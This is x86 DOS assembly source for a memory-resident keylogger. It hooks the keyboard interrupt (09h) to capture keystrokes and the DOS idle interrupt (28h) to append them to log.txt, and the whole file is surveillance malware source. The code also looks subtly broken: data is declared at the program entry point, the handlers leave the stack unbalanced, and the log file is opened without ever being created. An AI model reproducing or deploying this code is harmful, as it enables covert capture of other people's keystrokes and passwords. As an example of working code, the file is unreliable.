locals @@
.186
.model tiny

.code
org 100h
Start:
FileName		db	"log.txt",0
buffer			db 100h dup(0)
head			db 0
tail			db 0
Old09h			dd 0
Old28h			dd 0

		mov	ax, 3509h				;Getting 09h interrupt pointer
		int	21h
		mov	word ptr Old09h, bx		;Saving old 09h interrupt addr
		mov	word ptr Old09h+2, es
		mov	ax, 2509h
		mov	dx, offset New09h
		int	21h						;Pushing new 09h interrupt function
	
		mov	ax, 3528h				;Getting 28h interrupt pointer
		int	21h
		mov	word ptr Old28h, bx		;Saving old 28h interrupt addr
		mov	word ptr Old28h+2, es
		mov	ax, 2528h
		mov	dx, offset New28h
		int	21h						;Pushing new 28h interrupt function

		mov ax, 3100h
		mov dx, offset EndLabel
		shr dx, 4
		inc dx
		int 21h						;Terminate & Stay resident

		ret



;=========================================================
; Reads symbols from keyboard and pushes them into buffer
;=========================================================
New09h	proc
		pusha
		pushf
		call dword ptr cs:[Old09h]	;Call old interrupt handler

		mov ah, 01h
		int 16h						;Take keycode
		jz @@Empty					;Check if a key is available

		inc cs:[head]		;Move head pointer
		mov di, offset buffer
		xor bx, bx
		mov bl, cs:[head]	
		add di, bx					;Get next free buffer position
		mov cs:[di], al 			;Push ASCII code into buffer
@@Empty:
		popa
		iret
		endp


;=========================================================
; Writes symbols from buffer into file
;=========================================================
New28h	proc
		pusha
		pushf
		call dword ptr cs:[Old28h]

		local head_old:byte
		mov dl, cs:[head]
		mov cs:[head_old], dl
		push cs
		pop ds
		mov dx, offset FileName		
		mov ax, 3D01h
		int 21h						;Open file

		mov bx, ax
		mov ax, 4202h
		xor cx, cx					;Set pointer offset to 0
		xor dx, dx
		int 21h						;Move file pointer to end of file

		mov cl, cs:[head_old]
		sub cl, cs:[tail]			;Count symbols in buffer
		mov dx, offset buffer
		xor ax, ax
		mov al, cs:[tail]
		add dx, ax
		mov ah, 40h
		int 21h						;Write buffer into file

		mov ah, 3Eh
		int 21h						;Close file

		mov al, cs:[head_old]
		mov cs:[tail], al			;Change tail position

		popa
		iret
		endp


EndLabel:
end 	Start